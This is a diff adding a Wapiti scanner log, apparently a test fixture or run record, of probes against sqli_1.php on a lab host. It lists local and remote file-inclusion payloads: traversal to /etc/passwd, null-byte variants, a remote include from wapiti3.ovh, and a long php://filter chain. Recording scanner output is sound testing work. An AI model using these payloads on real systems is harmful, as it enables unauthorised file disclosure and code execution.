@@ -1,0 +1,1217 @@
+2024-03-20 16:41:19.405 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/sqli_1.php?title=fuzz&action=search (0)
+2024-03-20 16:41:19.522 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/sqli_1.php?title=default&action=search (1)
+2024-03-20 16:41:19.523 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:41:19.523 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13
+2024-03-20 16:41:19.524 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/sqli_1.php (1)
+2024-03-20 16:41:19.688 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-20 16:41:19.688 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_10617f40.db
+2024-03-20 16:41:19.691 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 5 URLs and forms during the scan
+2024-03-20 16:41:19.722 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-20 16:41:19.722 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-20 16:41:19.807 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-20 16:41:19.836 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-20 16:41:19.837 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
+2024-03-20 16:41:19.853 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=fuzz&action=search (0)
+2024-03-20 16:41:19.856 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&action=search (0)
+2024-03-20 16:41:19.871 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&action=search (0)
+2024-03-20 16:41:19.884 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=%2Fetc%2Fpasswd&action=search (0)
+2024-03-20 16:41:19.900 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=%2Fetc%2Fpasswd%00&action=search (0)
+2024-03-20 16:41:19.911 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=%2Fetc%2Fservices&action=search (0)
+2024-03-20 16:41:19.922 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=%2Fetc%2Fservices%00&action=search (0)
+2024-03-20 16:41:19.934 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&action=search (0)
+2024-03-20 16:41:19.949 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&action=search (0)
+2024-03-20 16:41:19.962 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&action=search (0)
+2024-03-20 16:41:19.976 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=search (0)
+2024-03-20 16:41:19.990 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=search (0)
+2024-03-20 16:41:20.005 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&action=search (0)
+2024-03-20 16:41:20.017 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&action=search (0)
+2024-03-20 16:41:20.033 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&action=search (0)
+2024-03-20 16:41:20.044 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=search (0)
+2024-03-20 16:41:20.056 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=search (0)
+2024-03-20 16:41:20.067 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=search (0)
+2024-03-20 16:41:20.078 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=search (0)
+2024-03-20 16:41:20.090 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=search (0)
+2024-03-20 16:41:20.101 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=search (0)
+2024-03-20 16:41:20.112 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=search (0)
+2024-03-20 16:41:20.130 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=search (0)
+2024-03-20 16:41:20.144 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=search (0)
+2024-03-20 16:41:20.162 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=search (0)
+2024-03-20 16:41:20.178 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=search (0)
+2024-03-20 16:41:20.195 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=search (0)
+2024-03-20 16:41:20.212 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&action=search (0)
+2024-03-20 16:41:20.226 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=search (0)
+2024-03-20 16:41:20.239 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=search (0)
+2024-03-20 16:41:20.251 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=search (0)
+2024-03-20 16:41:20.264 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=search (0)
+2024-03-20 16:41:20.277 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=search (0)
+2024-03-20 16:41:20.292 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=search (0)
+2024-03-20 16:41:20.305 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=search (0)
+2024-03-20 16:41:20.318 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=search (0)
+2024-03-20 16:41:20.331 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=search (0)
+2024-03-20 16:41:20.344 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=search (0)
+2024-03-20 16:41:20.358 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=search (0)
+2024-03-20 16:41:20.374 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=search (0)
+2024-03-20 16:41:20.393 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=search (0)
+2024-03-20 16:41:20.413 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=search (0)
+2024-03-20 16:41:20.436 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=search (0)
+2024-03-20 16:41:20.455 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=search (0)
+2024-03-20 16:41:20.473 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=search (0)
+2024-03-20 16:41:20.490 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=search (0)
+2024-03-20 16:41:20.510 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=search (0)
+2024-03-20 16:41:20.524 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=search (0)
+2024-03-20 16:41:20.539 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=search (0)
+2024-03-20 16:41:20.553 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=search (0)
+2024-03-20 16:41:20.565 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=search (0)
+2024-03-20 16:41:20.578 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=search (0)
+2024-03-20 16:41:20.594 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=file%3A%2F%2F%2Fetc%2Fpasswd&action=search (0)
+2024-03-20 16:41:20.610 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&action=search (0)
+2024-03-20 16:41:20.625 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&action=search (0)
+2024-03-20 16:41:20.637 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&action=search (0)
+2024-03-20 16:41:20.648 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&action=search (0)
+2024-03-20 16:41:20.663 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&action=search (0)
+2024-03-20 16:41:20.678 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=search (0)
+2024-03-20 16:41:20.690 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=search (0)
+2024-03-20 16:41:20.701 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=sqli_1.php&action=search (0)
+2024-03-20 16:41:20.713 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=sqli_1.php%00&action=search (0)
+2024-03-20 16:41:20.728 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=sqli_1.php%3A%3A%24DATA&action=search (0)
+2024-03-20 16:41:20.747 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
+2024-03-20 16:41:20.762 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (0)
+2024-03-20 16:41:20.774 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%2Fetc%2Fpasswd (0)
+2024-03-20 16:41:20.791 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:41:20.805 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%2Fetc%2Fservices (0)
+2024-03-20 16:41:20.820 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%2Fetc%2Fservices%00 (0)
+2024-03-20 16:41:20.833 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
+2024-03-20 16:41:20.845 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00 (0)
+2024-03-20 16:41:20.859 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA (0)
+2024-03-20 16:41:20.873 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:41:20.886 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:41:20.900 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA (0)
+2024-03-20 16:41:20.915 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F (0)
+2024-03-20 16:41:20.929 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F (0)
+2024-03-20 16:41:20.942 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
